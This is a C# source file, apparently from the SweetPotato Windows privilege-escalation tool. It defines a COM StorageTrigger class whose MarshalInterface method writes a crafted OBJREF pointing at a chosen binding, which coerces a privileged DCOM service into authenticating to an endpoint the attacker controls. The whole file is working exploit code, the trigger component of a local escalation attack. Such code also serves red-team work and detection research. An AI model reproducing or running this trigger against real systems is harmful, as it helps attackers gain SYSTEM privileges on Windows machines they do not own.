b'\xef\xbb\xbfusing System;\nusing System.Runtime.InteropServices;\n\nnamespace SweetPotato {\n\n    [ComVisible(true)]\n    internal class StorageTrigger : IMarshal, IStorage {\n\n        private IStorage storage;\n        private string binding;\n        private TowerProtocol towerProtocol;\n\n        public StorageTrigger(IStorage storage, string binding, TowerProtocol towerProtocol) {\n            this.storage = storage;\n            this.binding = binding;\n            this.towerProtocol = towerProtocol;\n        }\n\n        public void DisconnectObject(uint dwReserved) {\n        }\n\n        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize) {\n            pSize = 1024;\n        }\n\n        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid) {\n            pCid = new Guid("00000306-0000-0000-c000-000000000046");\n        }\n\n        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS) {\n\n            ObjRef objRef = new ObjRef(Ole32.IID_IUnknown,\n                  new ObjRef.Standard(0x1000, 1, 0x0703d84a06ec96cc, 0x539d029cce31ac, new Guid("{042c939f-54cd-efd4-4bbd-1c3bae972145}"),\n                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));\n\n            uint written;\n            byte[] data = objRef.GetBytes();\n            pstm.Write(data, (uint)data.Length, out written);\n        }\n\n        public void ReleaseMarshalData(IStream pstm) {\n        }\n\n        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv) {\n            ppv = IntPtr.Zero;\n        }\n\n        public void Commit(uint grfCommitFlags) {\n            storage.Commit(grfCommitFlags);\n        }\n\n        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest) {\n            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);\n        }\n\n        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg) {\n            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);\n        }\n\n        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm) {\n            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);\n        }\n\n        public void DestroyElement(string pwcsName) {\n            storage.DestroyElement(pwcsName);\n        }\n\n        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum) {\n            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);\n        }\n\n        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags) {\n            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);\n        }\n\n        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg) {\n            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);\n        }\n\n        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm) {\n            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);\n        }\n\n        public void RenameElement(string pwcsOldName, string pwcsNewName) {\n\n        }\n\n        public void Revert() {\n\n        }\n\n        public void SetClass(ref Guid clsid) {\n\n        }\n\n        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime) {\n\n        }\n\n        public void SetStateBits(uint grfStateBits, uint grfMask) {\n        }\n\n        public void Stat(STATSTG[] pstatstg, uint grfStatFlag) {\n            storage.Stat(pstatstg, grfStatFlag);\n            pstatstg[0].pwcsName = "hello.stg";\n        }\n    }\n}\n'